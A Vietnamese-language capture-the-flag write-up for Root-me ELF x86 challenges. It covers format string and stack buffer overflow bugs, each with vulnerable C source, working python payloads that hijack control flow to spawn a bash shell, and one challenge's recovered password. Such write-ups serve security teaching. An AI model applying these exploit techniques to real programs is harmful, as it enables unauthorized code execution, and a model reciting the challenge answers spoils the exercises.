# Root me (pwn)

## ELF x86 - Format string bug basic 1

```c
#include <stdio.h>
#include <unistd.h>
 
int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```

Bài này là format string nên bug sẽ nằm ở hàm printf ta test thử nhập vào %p xem chương trình sẽ in ra tham số như thế nào

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Decode output từ hex ta sẽ được password

&#x20;

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

9apD()6dmapE

## ELF x86 - Format string bug basic 2

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main( int argc, char ** argv )
 
{
 
        int var;
        int check  = 0x04030201;
 
        char fmt[128];
 
        if (argc <2)
                exit(0);
 
        memset( fmt, 0, sizeof(fmt) );
 
        printf( "check at 0x%x\n", &check );
        printf( "argv[1] = [%s]\n", argv[1] );
 
        snprintf( fmt, sizeof(fmt), argv[1] );
 
        if ((check != 0x04030201) && (check != 0xdeadbeef))    
                printf ("\nYou are on the right way !\n");
 
        printf( "fmt=[%s]\n", fmt );
        printf( "check=0x%x\n", check );
 
        if (check==0xdeadbeef)
        {
                printf("Yeah dude ! You win !\n");
                setreuid(geteuid(), geteuid());
                system("/bin/bash");
        }
}
```

## ELF x86 - Stack buffer overflow basic 1

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

Easy buffer overflow bug sẽ nằm ở  [fgets](http://www.opengroup.org/onlinepubs/009695399/functions/fgets.html)(buf,45,stdin); vì chương trình chỉ cho nhập 40 ký tự nhưng ở đây lại cho 45 nên ta sẽ ghi đè lên nó để đọc shell&#x20;

payload : (python -c  'print "A" \* 40  + "\xef\xbe\xad\xde"'; cat) | ./ch13

Dùng cat để giữ shell

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## ELF x86 Stack buffer overflow basic 2

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
 
void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
 
void main()
{
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}\
```

```c
fgets(buf,133,stdin);
```

Biến buf chỉ có 128 giá trị nhưng hàm fgets lại cho nhập tới 133 nên sẽ xuất hiện lỗi buffer overflow ở đây . Lúc này ta sẽ tìm cách ghi đè sao cho có thể chạy được hàm shell() để có thể dùng bash shell

Để ghi lấy được hàm shell ta cần biết địa chỉ của nó&#x20;

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Ở đây địa chỉ của hàm shell sẽ là 0x8048516 chuyển thành little edian sẽ là \x16\x85\x04\x08

\=> payload : (python -c  'print "A" \* 128  + "\x16\x85\x04\x08"'; cat) | ./ch15

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## ELF x86 - Stack buffer overflow basic 3

```c
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
 
void shell(void);
 
int main()
{
 
  char buffer[64];
  int check;
  int i = 0;
  int count = 0;
 
  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc)
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08:
                  count--;
                  printf("\b");
                  break;
                case 0x04:
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}
 
void shell(void)
{
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
```

```c
                case 0x08:
                  count--;
                  printf("\b");
                  break;
```

Ở đây không thể ghi đè từ trên xuống vì count đã chặn chỉ cho 65 ký tự r

Nên lúc này ta sẽ đẩy từ dưới lên vì count sẽ không check giá trị âm nên khi count bị âm thì nó sẽ bị overwrite mà ở đây để vào được shell thì check phải bằng 0xbfffabc =>  Ở đây là 4 bytes nên ta sẽ trừ count đi 4 lần&#x20;

\=> payload : (python -c  'print "\x08" \* 4 + "\xbc\xfa\xff\xbf"'; cat) | ./ch16

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

